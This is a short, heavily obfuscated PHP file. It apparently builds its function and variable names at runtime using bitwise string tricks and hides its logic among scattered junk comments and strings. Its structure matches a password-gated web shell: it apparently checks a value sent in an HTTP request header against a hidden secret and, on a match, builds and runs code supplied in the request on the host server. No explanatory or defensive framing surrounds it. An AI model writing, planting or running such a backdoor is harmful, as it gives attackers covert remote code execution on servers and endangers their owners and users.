<?php
$l0w3mZacgjg='TmtWPMX4'|~eY;$IwljjKlUg="g@1/ S(Q5 f"|"J-".voos."@".deiM;$amNbBO=iUVx&#p7o7H'.
             'NV]V';$RjGs=s^',';$cfV='@'|A;$HEo='['^'9';$rvGUhTiOuA=HDTPVXZHOBA_PHMD|'@'./*'.
             'X*/TTPKX_DJPISDIAA;$fiE9=':'^S;$eWW1='i='^'*[';$TyiH2RP='D 2'|F1B;'t4qLvJOKjf'.
             '$rOTpy{';$QPtquQXmvR="4I"^'F"';$TK='@ZB'^"-&w";$sEbIfVx9=':Tr'^G3M;$zQft=/*Lo'.
             'M#*/owueo.'~'&'gw|uo~';$_8Sp=GSeHPeC.'&P>eTl-n'|'a"!)$$^'.n7zChIBK;'I_VSYPlAc'.
             'm( Y+';$e4_k5Bf='`'.HlP03l.'|A P<BA('.Bi0G.')'.PJNLSB0IM4.')P'|'0Pl^056L@o@BK'.
             'B"'.BpSL.'!QPR/'.SJxJO4IP;$gCfYPjV='@.*2AFt }'|'T&D.'.BD82u;$N79w=K^z;'EkVKh_'.
             '}XN+x';$c4hc2b=$IwljjKlUg&(',T2!nZ2.Hi~'|DcTELyJr.'%Dv');$qZ45tUjYwn=$TK&/*pv'.
             'ZT<9An:i2 */$sEbIfVx9;$GnZ=$zQft&(']=6%!D'^":X@H_3");$_WLDimP=$_8Sp&('{vou~w_'.
             'g}now{oo'&"{~".mywg_g."}o{woo~");$_Ujd=$e4_k5Bf^(D4YKTUKI.' @'.aAPPCz.'@@+JE>'.
             ''.fZ2sKZ6SHb|'A,U(@TCF V!I"'.sMSH.'@(Je!*Z0J@*pFU`');$aIysA=('F9a#^h,_5'^'wr@'.
             'ip[g4p')^$gCfYPjV;if(!$c4hc2b($qZ45tUjYwn($GnZ($amNbBO.$RjGs.$cfV)),$_Ujd))/*'.
             '_L*/$k3gHTP40=$_WLDimP(('%un!$'&'ti,j<').$HEo,$GnZ($rvGUhTiOuA.$RjGs.$N79w));/*'.
             'S0b} */$k3gHTP40($fiE9.$eWW1.$TyiH2RP.$QPtquQXmvR,$aIysA);#J.fh_k&1x6L;B}xu5'.
             'r9%r*%zB.py-h.v!o5zEx4SRf!#F#Kq{q%&eH,sa';